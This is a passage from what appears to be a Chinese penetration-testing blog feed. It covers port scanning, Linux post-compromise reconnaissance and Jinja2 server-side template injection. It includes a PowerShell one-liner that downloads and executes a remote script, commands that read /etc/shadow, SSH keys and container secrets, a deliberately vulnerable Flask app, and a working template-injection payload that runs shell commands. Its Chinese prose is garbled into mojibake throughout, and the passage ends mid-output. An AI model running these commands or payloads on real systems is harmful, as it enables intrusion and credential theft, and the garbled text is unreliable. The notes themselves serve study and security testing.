class="hljs-variable">$grepStream</span> <span class="hljs-literal">-xmlStream</span> <span class="hljs-variable">$xmlStream</span> <span class="hljs-literal">-readableStream</span> <span class="hljs-variable">$readableStream</span> <span class="hljs-literal">-SkipDiscovery</span> <span class="hljs-variable">$SkipDiscovery</span><br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$grepStream</span>) &#123;<br>                    <span class="hljs-variable">$grepStream</span>.flush()<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                    <span class="hljs-variable">$xmlStream</span>.flush()<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$readableStream</span>) &#123;<br>                    <span class="hljs-variable">$readableStream</span>.flush()<br>                &#125;<br><br>                <span class="hljs-variable">$saveIteration</span> ++<br>            &#125;<br><br>            <span class="hljs-variable">$enddate</span> = <span class="hljs-built_in">Get-Date</span><br>            <span class="hljs-variable">$totaltime</span> = (<span class="hljs-variable">$enddate</span> - <span class="hljs-variable">$startdate</span>).TotalSeconds<br>            <span class="hljs-variable">$endMsg</span> = <span class="hljs-string">&quot;Port scan complete at <span class="hljs-variable">$enddate</span> (<span class="hljs-variable">$totaltime</span> seconds)&quot;</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                <span class="hljs-variable">$endMsg</span> += <span class="hljs-string">&quot;, <span class="hljs-variable">$upHosts</span> hosts are up&quot;</span><br>            &#125;<br><br>            <span class="hljs-built_in">Write-PortscanOut</span> <span class="hljs-literal">-comment</span> <span class="hljs-variable">$endMsg</span> <span class="hljs-literal">-grepStream</span> <span class="hljs-variable">$grepStream</span> <span class="hljs-literal">-xmlStream</span> <span class="hljs-variable">$xmlStream</span> <span class="hljs-literal">-readableStream</span> <span class="hljs-variable">$readableStream</span><br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$grepStream</span>) &#123;<br>                <span class="hljs-variable">$grepStream</span>.Close()<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                <span class="hljs-variable">$xmlStream</span>.Close()<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$readableStream</span>) &#123;<br>                <span class="hljs-variable">$readableStream</span>.Close()<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$scannedHostList</span><br><br>        &#125;<br>        <span class="hljs-keyword">Catch</span><br>        &#123;<br>            <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>.Exception.Message;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ— æ–‡ä»¶è½åœ°</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#x27;445,1433,80,8080,3389&#x27;&quot;<br></code></pre></td></tr></table></figure><ul><li>æœ‰æ–‡ä»¶è½åœ°</li></ul><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#x27;445,1433,80,8080,3389&#x27;&quot;<br></code></pre></td></tr></table></figure></blockquote><h3 id="Telnet-1"><a href="#Telnet-1" class="headerlink" title="Telnet"></a>Telnet</h3><blockquote><p>telnet DC 22</p></blockquote><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><blockquote><p>search portscan</p><p>use anxiliary/scanner/portscan/tcp</p></blockquote><h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><blockquote><p>nc.exe -vv 192.168.7.7 3389</p><p>nc.exe -rz -w 2 -vv 192.168.7.7 0-65535</p><p>-r éšæœºæŒ‡å®šæœ¬åœ°ä¸è¿œç«¯ä¸»æœºçš„é€šä¿¡ç«¯å£<br>-z ä½¿ç”¨ 0 è¾“å…¥/è¾“å‡ºæ¨¡å¼ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨<br>-w&lt;è¶…æ—¶ç§’æ•°&gt; è®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´</p></blockquote><h3 id="fscan-1"><a href="#fscan-1" class="headerlink" title="fscan"></a>fscan</h3><h3 id="scanline-1"><a href="#scanline-1" class="headerlink" title="scanline"></a>scanline</h3><p>è§ä¸Š</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>linux æœ‰åŸŸæ§çš„æ¦‚å¿µå— æˆ‘çš„çœ‹æ³•æ˜¯æ²¡æœ‰ ä½†æ˜¯å¯ä»¥é…ç½®å¯¹åº”çš„åŠŸèƒ½ï¼Œæˆ–è€…åŠ å…¥åŸŸï¼Œè¿™äº›æ˜¯å¯ä»¥å®ç°çš„</p><p>ä¸‹é¢æ˜¯ä¸€äº›åœ¨ linux å†…ç½‘çš„ä¿¡æ¯æ”¶é›†</p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h3 id="è·å–å†…æ ¸ï¼Œæ“ä½œç³»ç»Ÿå’Œè®¾å¤‡ä¿¡æ¯"><a href="#è·å–å†…æ ¸ï¼Œæ“ä½œç³»ç»Ÿå’Œè®¾å¤‡ä¿¡æ¯" class="headerlink" title="è·å–å†…æ ¸ï¼Œæ“ä½œç³»ç»Ÿå’Œè®¾å¤‡ä¿¡æ¯"></a>è·å–å†…æ ¸ï¼Œæ“ä½œç³»ç»Ÿå’Œè®¾å¤‡ä¿¡æ¯</h3><ul><li><ul><li><p>ç‰ˆæœ¬ä¿¡æ¯</p><p><code>uname -a</code> æ‰€æœ‰ç‰ˆæœ¬ <code>uname -r</code> å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯ <code>uname -n</code> ç³»ç»Ÿä¸»æœºåå­— <code>uname -m</code> Linux å†…æ ¸æ¶æ„</p></li></ul></li><li><p>å†…æ ¸ä¿¡æ¯ <code>cat /proc/version</code></p></li><li><p>CPU ä¿¡æ¯ <code>cat /proc/cpuinfo</code></p></li><li><ul><li><p>å‘å¸ƒä¿¡æ¯</p><p><code>cat /etc/*-release</code> <code>cat /etc/issue</code></p></li></ul></li><li><p>ä¸»æœºå <code>hostname</code></p></li><li><p>æ–‡ä»¶ç³»ç»Ÿ <code>df -a</code></p></li><li><p>å†…æ ¸æ—¥å¿— <code>dmesg</code> / <code>/var/log/dmesg</code></p></li></ul><h3 id="ç”¨æˆ·å’Œç»„"><a href="#ç”¨æˆ·å’Œç»„" class="headerlink" title="ç”¨æˆ·å’Œç»„"></a>ç”¨æˆ·å’Œç»„</h3><ul><li><p>åˆ—å‡ºç³»ç»Ÿæ‰€æœ‰ç”¨æˆ· <code>cat /etc/passwd</code></p></li><li><p>åˆ—å‡ºç³»ç»Ÿæ‰€æœ‰ç»„ <code>cat /etc/group</code></p></li><li><p>åˆ—å‡ºæ‰€æœ‰ç”¨æˆ· hashï¼ˆrootï¼‰<code>cat /etc/shadow</code></p></li><li><ul><li><p>ç”¨æˆ·</p><p>æŸ¥è¯¢ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯ <code>finger</code> å½“å‰ç™»å½•çš„ç”¨æˆ· <code>users</code> <code>who -a</code> <code>/var/log/utmp</code> æŸ¥è¯¢æ— å¯†ç ç”¨æˆ· <code>grep &#39;x:0:&#39; /etc/passwd</code></p></li></ul></li><li><p>ç›®å‰ç™»å½•çš„ç”¨æˆ· <code>w</code></p></li><li><p>ç™»å…¥è¿‡çš„ç”¨æˆ·ä¿¡æ¯ <code>last</code> / <code>/var/log/wtmp</code></p></li><li><p>æ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€è¿‘ä¸€æ¬¡ç™»å½•ä¿¡æ¯ <code>lastlog</code> / <code>/var/log/lastlog</code></p></li><li><p>ç™»å½•æˆåŠŸæ—¥å¿— <code>/var/log/secure</code></p></li><li><p>ç™»å½•å¤±è´¥æ—¥å¿— <code>/var/log/faillog</code></p></li><li><p>æŸ¥çœ‹ç‰¹æƒç”¨æˆ· <code>grep :0 /etc/passwd</code></p></li><li><p>æŸ¥çœ‹ passwd æœ€åä¿®æ”¹æ—¶é—´ <code>ls -l /etc/passwd</code></p></li><li><p>æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ç©ºå£ä»¤ç”¨æˆ· <code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code></p></li><li><p>æŸ¥çœ‹è¿œç¨‹ç™»å½•çš„è´¦å· <code>awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p></li><li><ul><li><p>æŸ¥çœ‹å…·æœ‰ sudo æƒé™çš„ç”¨æˆ·</p><p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p></li></ul></li></ul><h3 id="ç”¨æˆ·å’Œæƒé™ä¿¡æ¯"><a href="#ç”¨æˆ·å’Œæƒé™ä¿¡æ¯" class="headerlink" title="ç”¨æˆ·å’Œæƒé™ä¿¡æ¯"></a>ç”¨æˆ·å’Œæƒé™ä¿¡æ¯</h3><ul><li>å½“å‰ç”¨æˆ· <code>whoami</code></li><li>å½“å‰ç”¨æˆ·ä¿¡æ¯ <code>id</code></li><li>å¯ä»¥ä½¿ç”¨ sudo æå‡åˆ° root çš„ç”¨æˆ·ï¼ˆrootï¼‰ <code>cat /etc/sudoers</code></li><li>åˆ—å‡ºç›®å‰ç”¨æˆ·å¯æ‰§è¡Œä¸æ— æ³•æ‰§è¡Œçš„æŒ‡ä»¤ <code>sudo -l</code></li></ul><h3 id="ç¯å¢ƒä¿¡æ¯"><a href="#ç¯å¢ƒä¿¡æ¯" class="headerlink" title="ç¯å¢ƒä¿¡æ¯"></a>ç¯å¢ƒä¿¡æ¯</h3><ul><li>æ‰“å°ç³»ç»Ÿç¯å¢ƒä¿¡æ¯ <code>env</code></li><li>æ‰“å°ç³»ç»Ÿç¯å¢ƒä¿¡æ¯ <code>set</code></li><li>ç¯å¢ƒå˜é‡ä¸­çš„è·¯å¾„ä¿¡æ¯ <code>echo $PATH</code></li><li>æ‰“å°å†å²å‘½ä»¤ <code>history</code> / <code>~/.bash_history</code></li><li>æ˜¾ç¤ºå½“å‰è·¯å¾„ <code>pwd</code></li><li>æ˜¾ç¤ºé»˜è®¤ç³»ç»Ÿéå† <code>cat /etc/profile</code></li><li>æ˜¾ç¤ºå¯ç”¨çš„ shell <code>cat /etc/shells</code></li></ul><h3 id="è¿›ç¨‹ä¿¡æ¯"><a href="#è¿›ç¨‹ä¿¡æ¯" class="headerlink" title="è¿›ç¨‹ä¿¡æ¯"></a>è¿›ç¨‹ä¿¡æ¯</h3><ul><li>æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ <code>ps aux</code></li><li>èµ„æºå æœ‰æƒ…å†µ <code>top -c</code></li><li>æŸ¥çœ‹è¿›ç¨‹å…³è”æ–‡ä»¶ <code>lsof -c $PID</code></li><li>å®Œæ•´å‘½ä»¤è¡Œä¿¡æ¯ <code>/proc/$PID/cmdline</code></li><li>è¿›ç¨‹çš„å‘½ä»¤å <code>/proc/$PID/comm</code></li><li>è¿›ç¨‹å½“å‰å·¥ä½œç›®å½•çš„ç¬¦å·é“¾æ¥ <code>/proc/$PID/cwd</code></li><li>è¿è¡Œç¨‹åºçš„ç¬¦å·é“¾æ¥ <code>/proc/$PID/exe</code></li><li>è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ <code>/proc/$PID/environ</code></li><li>è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µ <code>/proc/$PID/fd</code></li></ul><h3 id="æœåŠ¡ä¿¡æ¯"><a href="#æœåŠ¡ä¿¡æ¯" class="headerlink" title="æœåŠ¡ä¿¡æ¯"></a>æœåŠ¡ä¿¡æ¯</h3><ul><li>ç”± inetd ç®¡ç†çš„æœåŠ¡åˆ—è¡¨ <code>cat /etc/inetd.conf</code></li><li>ç”± xinetd ç®¡ç†çš„æœåŠ¡åˆ—è¡¨ <code>cat /etc/xinetd.conf</code></li><li>nfs æœåŠ¡å™¨çš„é…ç½® <code>cat /etc/exports</code></li><li>é‚®ä»¶ä¿¡æ¯ <code>/var/log/mailog</code></li><li>ssh é…ç½® <code>sshd_config</code></li></ul><h3 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h3><p>æ˜¾ç¤ºæŒ‡å®šç”¨æˆ·çš„è®¡åˆ’ä½œä¸šï¼ˆrootï¼‰ <code>crontab -l -u %user%</code></p><ul><li><ul><li><p>è®¡åˆ’ä»»åŠ¡</p><p><code>/var/spool/cron/*</code> <code>/var/spool/anacron/*</code> <code>/etc/crontab</code> <code>/etc/anacrontab</code> <code>/etc/cron.*</code> <code>/etc/anacrontab</code></p></li></ul></li><li><ul><li><p>å¼€æœºå¯åŠ¨é¡¹</p><p><code>/etc/rc.d/init.d/</code></p></li></ul></li></ul><h3 id="ç½‘ç»œã€è·¯ç”±å’Œé€šä¿¡"><a href="#ç½‘ç»œã€è·¯ç”±å’Œé€šä¿¡" class="headerlink" title="ç½‘ç»œã€è·¯ç”±å’Œé€šä¿¡"></a>ç½‘ç»œã€è·¯ç”±å’Œé€šä¿¡</h3><ul><li>åˆ—å‡ºç½‘ç»œæ¥å£ä¿¡æ¯ <code>/sbin/ifconfig -a</code> / <code>ip addr show</code></li><li>åˆ—å‡ºç½‘ç»œæ¥å£ä¿¡æ¯ <code>cat /etc/network/interfaces</code></li><li>æŸ¥çœ‹ç³»ç»Ÿ arp è¡¨ <code>arp -a</code></li><li>æ‰“å°è·¯ç”±ä¿¡æ¯ <code>route</code> / <code>ip ro show</code></li><li>æŸ¥çœ‹ dns é…ç½®ä¿¡æ¯ <code>cat /etc/resolv.conf</code></li><li>æ‰“å°æœ¬åœ°ç«¯å£å¼€æ”¾ä¿¡æ¯ <code>netstat -an</code></li><li>åˆ—å‡º iptable çš„é…ç½®è§„åˆ™ <code>iptables -L</code></li><li>æŸ¥çœ‹ç«¯å£æœåŠ¡æ˜ å°„ <code>cat /etc/services</code></li><li>Hostname <code>hostname -f</code></li><li>æŸ¥çœ‹è¿›ç¨‹ç«¯å£æƒ…å†µ <code>netstat -anltp | grep $PID</code></li></ul><h3 id="å·²å®‰è£…ç¨‹åº"><a href="#å·²å®‰è£…ç¨‹åº" class="headerlink" title="å·²å®‰è£…ç¨‹åº"></a>å·²å®‰è£…ç¨‹åº</h3><ul><li><code>rpm -qa --last</code> Redhat</li><li><code>yum list | grep installed</code> CentOS</li><li><code>ls -l /etc/yum.repos.d/</code></li><li><code>dpkg -l</code> Debian</li><li><code>cat /etc/apt/sources.list</code> Debian APT</li><li><code>pkg_info</code> xBSD</li><li><code>pkginfo</code> Solaris</li><li><code>pacman -Q</code> Arch Linux</li><li><code>emerge</code> Gentoo</li></ul><h3 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h3><ul><li>æœ€è¿‘äº”å¤©çš„æ–‡ä»¶ <code>find / -ctime +1 -ctime -5</code></li><li>æ–‡ä»¶ç³»ç»Ÿç»†èŠ‚ <code>debugfs</code></li></ul><h3 id="å…¬ç§é’¥ä¿¡æ¯"><a href="#å…¬ç§é’¥ä¿¡æ¯" class="headerlink" title="å…¬ç§é’¥ä¿¡æ¯"></a>å…¬ç§é’¥ä¿¡æ¯</h3><ul><li><code>~/.ssh</code></li><li><code>/etc/ssh</code></li></ul><h3 id="æ—¥å¿—"><a href="#æ—¥å¿—" class="headerlink" title="æ—¥å¿—"></a>æ—¥å¿—</h3><ul><li><code>/var/log/boot.log</code></li><li><code>/var/log/cron</code></li><li><code>/var/log/faillog</code></li><li><code>/var/log/lastlog</code></li><li><code>/var/log/messages</code></li><li><code>/var/log/secure</code></li><li><code>/var/log/syslog</code></li><li><code>/var/log/syslog</code></li><li><code>/var/log/wtmp</code></li><li><code>/var/log/wtmp</code></li><li><code>/var/run/utmp</code></li></ul><h3 id="è™šæ‹Ÿç¯å¢ƒæ£€æµ‹"><a href="#è™šæ‹Ÿç¯å¢ƒæ£€æµ‹" class="headerlink" title="è™šæ‹Ÿç¯å¢ƒæ£€æµ‹"></a>è™šæ‹Ÿç¯å¢ƒæ£€æµ‹</h3><ul><li><code>lsmod | grep -i &quot;vboxsf\|vboxguest&quot;</code></li><li><code>lsmod | grep -i &quot;vmw_baloon\|vmxnet&quot;</code></li><li><code>lsmod | grep -i &quot;xen-vbd\|xen-vnif&quot;</code></li><li><code>lsmod | grep -i &quot;virtio_pci\|virtio_net&quot;</code></li><li><code>lsmod | grep -i &quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</code></li></ul><h3 id="å®¹å™¨å†…ä¿¡æ¯æ”¶é›†"><a href="#å®¹å™¨å†…ä¿¡æ¯æ”¶é›†" class="headerlink" title="å®¹å™¨å†…ä¿¡æ¯æ”¶é›†"></a>å®¹å™¨å†…ä¿¡æ¯æ”¶é›†</h3><ul><li><code>capsh --print</code></li><li><code>cat /proc/1/cgroup</code></li><li><code>env | grep KUBE</code></li><li><code>ls -l .dockerenv</code></li><li><code>ls -l /run/secrets/Kubernetes.io/</code></li><li><code>mount</code></li><li><code>ps aux</code></li></ul><p>â€‹</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssti</title>
    <link href="/2022/01/02/SSTI/"/>
    <url>/2022/01/02/SSTI/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="SSTI-æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´"><a href="#SSTI-æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´" class="headerlink" title="SSTI-æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´"></a>SSTI-æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´</h2><p>æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ˜¯ç”±äºæœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„è¾“å…¥ï¼Œå°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œåœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„æ¶æ„å†…å®¹ï¼Œå› è€Œå¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShell ç­‰é—®é¢˜ã€‚å…¶å½±å“èŒƒå›´ä¸»è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§ã€‚</p><h3 id="Flask-Jinja2-æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥"><a href="#Flask-Jinja2-æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥" class="headerlink" title="Flask(Jinja2)æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥"></a><strong>Flask(Jinja2)æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥</strong></h3><p>Jinja2 æ˜¯ç”¨äº Python çš„å…¨åŠŸèƒ½æ¨¡æ¿å¼•æ“ã€‚å®ƒå…·æœ‰å®Œæ•´çš„ unicode æ”¯æŒï¼Œä¸€ä¸ªå¯é€‰çš„é›†æˆæ²™ç›’æ‰§è¡Œç¯å¢ƒï¼Œå·²è¢«å¹¿æ³›ä½¿ç”¨å¹¶è·å¾— BSD è®¸å¯ã€‚ Jinja2 ç”± Django æˆ– Flask ä¹‹ç±»çš„ Python Web æ¡†æ¶ä½¿ç”¨ã€‚</p><p>Jinja å®˜æ–¹ç½‘ç«™ï¼š</p><p><a href="https://jinja.palletsprojects.com/en/2.11.x/">https://jinja.palletsprojects.com/en/2.11.x/</a></p><ul><li>æ³¨å…¥æµ‹è¯•</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;Georg&#x27;</span>)<br>    t = Template(<span class="hljs-string">&quot;Hello &quot;</span> + name)<br>    <span class="hljs-keyword">return</span> t.render()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,port=<span class="hljs-string">&#x27;80&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è¯¦ç»†çš„ payload åˆ†æå’Œ nodejs çš„åŸå‹é“¾æœ‰ç‚¹ç›¸ä¼¼ï¼Œä¸‹é¢åˆ†æä¸€ä¸ª payloadï¼š</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%for c in [].__class__.__base__.__subclasses__()%&#125;<br>    &#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;<br>        &#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;<br>    &#123;%endif%&#125;<br>&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><p><strong>__class__</strong> ï¼Œæ˜¯ç±»çš„å†…ç½®å±æ€§ï¼Œå¯ä»¥ç”¨æ¥å¼•ç”¨ç±»</p><p><strong>__base__</strong> ï¼Œè¿”å›ç±»çš„åŸºç±»</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__</span><br>&lt;class &#x27;list&#x27;&gt;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; _</span><br>&lt;class &#x27;list&#x27;&gt;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; _.__mro__</span><br>(&lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__.__base__</span><br>&lt;class &#x27;object&#x27;&gt;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__.__bases__</span><br>(&lt;class &#x27;object&#x27;&gt;,)<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__.__mro__[1]</span><br>&lt;class &#x27;object&#x27;&gt;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt;</span><br></code></pre></td></tr></table></figure><p>å¯è§<strong>__bases__ï¼Œ__mro__<strong>ä¸</strong>__base__<strong>ä¸åŒï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°</strong>&lt;class â€˜objectâ€™&gt;<strong>ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥</strong>__mro__[1]<strong>æ¥è·å¾—</strong>&lt;class â€˜objectâ€™&gt;<strong>ï¼Œä¸‹é¢éƒ½ä½¿ç”¨<strong><strong>base</strong></strong>æ¥è·å–</strong>&lt;class â€˜objectâ€™&gt;</strong></p><p><strong>__subclasses__</strong> ï¼Œæ¯ä¸ªç±»ä¼šä¿å­˜å®ƒç›´æ¥å­ç±»çš„å¼±å¼•ç”¨ç»„æˆçš„åˆ—è¡¨ï¼Œæ­¤æ–¹æ³•è¿”å›åœ¨è¿™ä¸ªç±»ä¸­ç›´æ¥å­ç±»å¼•ç”¨ç»„æˆçš„åˆ—è¡¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__.__base__.__subclasses__()</span><br>[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, 